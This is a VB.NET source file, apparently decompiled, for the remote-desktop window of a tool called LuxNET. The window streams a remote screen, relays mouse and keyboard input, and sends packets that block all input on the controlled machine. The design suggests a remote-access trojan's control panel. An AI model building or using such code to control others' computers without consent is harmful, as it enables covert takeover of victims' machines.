Imports LuxNET.My.Resources
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class RemoteDesktop
    Public Sub New()
        Me.ausgefahren = False
        Me.packer = New LuxNET.Pack
        Me.recording = False
        Me.control = False
        Me.keyboard = False
        Me.block = False
        Me.InitializeComponent()
    End Sub

    Private Sub btn_control_Click(sender As Object, e As EventArgs) Handles btn_control.Click
        If Me.control Then
            Me.control = False
            Me.btn_control.BackgroundImage = My.Resources.mouse
        Else
            Me.control = True
            Me.btn_control.BackgroundImage = My.Resources.mouse__arrow
        End If
    End Sub

    Private Sub btn_keyboard_Click(sender As Object, e As EventArgs) Handles btn_keyboard.Click
        If Me.keyboard Then
            Me.keyboard = False
            Me.btn_keyboard.BackgroundImage = My.Resources.keyboard
        Else
            Me.keyboard = True
            Me.btn_keyboard.BackgroundImage = My.Resources.keyboard__arrow
        End If
    End Sub

    Private Sub btn_start_Click(sender As Object, e As EventArgs) Handles btn_start.Click
        If Not Me.recording Then
            Me.SendPacket(New Object() {CByte(1), "Start", RuntimeHelpers.GetObjectValue(Me.ComboBox1.SelectedItem)})
            Me.btn_start.BackgroundImage = My.Resources.monitor_off
            Me.recording = True
        Else
            Me.SendPacket(New Object() {CByte(1), "Stop", 1})
            Me.btn_start.BackgroundImage = My.Resources.monitor
            Me.recording = False
            Me.LabelFPS.Text = "FPS: 0"
            Me.PictureBox1.Image = Nothing
            Me.control = False
            Me.btn_control.BackgroundImage = My.Resources.mouse
            Me.keyboard = False
            Me.btn_keyboard.BackgroundImage = My.Resources.keyboard
        End If
    End Sub

    Private Sub Panel1_Click(sender As Object, e As EventArgs) Handles Panel1.Click
        Dim point2 As Point
        If Not Me.ausgefahren Then
            Me.Panel2.Visible = True
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), &H2F)
            Me.Panel1.Location = point2
            Me.Panel1.BackgroundImage = My.Resources.arrow_090
            Me.ausgefahren = True
        Else
            Me.Panel1.BackgroundImage = My.Resources.arrow_270
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), 0)
            Me.Panel1.Location = point2
            Me.Panel2.Visible = False
            Me.ausgefahren = False
        End If
    End Sub

    Private Sub Panel1_MouseEnter(sender As Object, e As EventArgs) Handles Panel1.MouseEnter
        Me.Panel1.BackColor = Color.LightGray
    End Sub

    Private Sub Panel1_MouseLeave(sender As Object, e As EventArgs) Handles Panel1.MouseLeave
        Me.Panel1.BackColor = SystemColors.Control
    End Sub

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint
        Dim path As New GraphicsPath
        path.AddRectangle(Me.Panel2.DisplayRectangle)
        e.Graphics.FillPath(New SolidBrush(Color.FromArgb(&H60, &H9F, &HD0)), path)
    End Sub

    Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseDown
        If Me.control Then
            If (e.Button = MouseButtons.Left) Then
                Me.SendMouse("LeftDown", CInt(Math.Round(CDbl(((CDbl(Me.pcwidth) / CDbl(Me.PictureBox1.Size.Width)) * Me.mousex)))), CInt(Math.Round(CDbl(((CDbl(Me.pcheight) / CDbl(Me.PictureBox1.Size.Height)) * Me.mousey)))))
            ElseIf (e.Button = MouseButtons.Right) Then
                Me.SendMouse("RightDown", CInt(Math.Round(CDbl(((CDbl(Me.pcwidth) / CDbl(Me.PictureBox1.Size.Width)) * Me.mousex)))), CInt(Math.Round(CDbl(((CDbl(Me.pcheight) / CDbl(Me.PictureBox1.Size.Height)) * Me.mousey)))))
            End If
        End If
    End Sub

    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        Me.Label_Mouse.Text = String.Format("Mouse Position: X:{0} | Y:{1}", e.X, e.Y)
        Me.mousex = e.X
        Me.mousey = e.Y
        If ((((e.Location.X >= 0) And (e.Location.X <= Me.Size.Width)) And (e.Location.Y >= 0)) And (e.Location.Y <= &H19)) Then
            Me.Panel1.Visible = True
        ElseIf Not Me.ausgefahren Then
            Me.Panel1.Visible = False
        End If
    End Sub

    Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseUp
        If Me.control Then
            If (e.Button = MouseButtons.Left) Then
                Me.SendMouse("LeftUp", CInt(Math.Round(CDbl(((CDbl(Me.pcwidth) / CDbl(Me.PictureBox1.Size.Width)) * Me.mousex)))), CInt(Math.Round(CDbl(((CDbl(Me.pcheight) / CDbl(Me.PictureBox1.Size.Height)) * Me.mousey)))))
            ElseIf (e.Button = MouseButtons.Right) Then
                Me.SendMouse("RightUp", CInt(Math.Round(CDbl(((CDbl(Me.pcwidth) / CDbl(Me.PictureBox1.Size.Width)) * Me.mousex)))), CInt(Math.Round(CDbl(((CDbl(Me.pcheight) / CDbl(Me.PictureBox1.Size.Height)) * Me.mousey)))))
            End If
        End If
    End Sub

    Private Sub RemoteDesktop_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If Me.recording Then
            e.Cancel = True
        End If
    End Sub

    Private Sub RemoteDesktop_KeyPress(sender As Object, e As KeyPressEventArgs) Handles Me.KeyPress
        If (Me.PictureBox1.Bounds.Contains(Me.PointToClient(Cursor.Position)) AndAlso Me.keyboard) Then
            If (e.KeyChar = ChrW(13)) Then
                Me.SendKey("{Enter}")
            End If
            Me.SendKey(Conversions.ToString(e.KeyChar))
        End If
    End Sub

    Private Sub RemoteDesktop_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.KeyPreview = True
        Me.SendPacket(New Object() {CByte(2)})
        Me.SendPacket(New Object() {CByte(4), 0})
    End Sub

    Private Sub RemoteDesktop_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Dim point2 As Point
        If Me.ausgefahren Then
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), &H2F)
            Me.Panel1.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel2.Size.Width) / 2))))), 0)
            Me.Panel2.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Panel2.Size.Width) / 2) - (CDbl(Me.PanelItems.Size.Width) / 2))))), 3)
            Me.PanelItems.Location = point2
        Else
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), 0)
            Me.Panel1.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel2.Size.Width) / 2))))), 0)
            Me.Panel2.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Panel2.Size.Width) / 2) - (CDbl(Me.PanelItems.Size.Width) / 2))))), 3)
            Me.PanelItems.Location = point2
        End If
    End Sub

    Private Sub SendKey(ByVal key As String)
        Me.SendPacket(New Object() {CByte(5), key})
    End Sub

    Private Sub SendMouse(ByVal button As String, ByVal x As Integer, ByVal y As Integer)
        Me.SendPacket(New Object() {CByte(3), button, x, y})
    End Sub

    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.userclient.Send(data)
    End Sub

    Private ausgefahren As Boolean
    Private block As Boolean
    Private control As Boolean
    Private keyboard As Boolean
    Private mousex As Integer
    Private mousey As Integer
    Private packer As LuxNET.Pack
    Public pcheight As Integer
    Public pcwidth As Integer
    Private recording As Boolean
    Public userclient As ServerClient

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        BlockEverything = &H43
        Keyboard = 5
        MonitorCounts = 2
        Mouse = 3
        NewConnection = 0
        PcBounds = 4
        RemoteDesktop = 1
        UnblockEverything = &H44
    End Enum

    Private Sub btn_block_Click(sender As Object, e As EventArgs) Handles btn_block.Click
        If Me.block Then
            Me.SendPacket(New Object() {CByte(&H44)})
            Me.block = False
            Me.btn_block.BackgroundImage = My.Resources.computer__exclamation
        Else
            Me.SendPacket(New Object() {CByte(&H43)})
            Me.block = True
            Me.btn_block.BackgroundImage = My.Resources.computer__arrow
        End If
    End Sub
End Class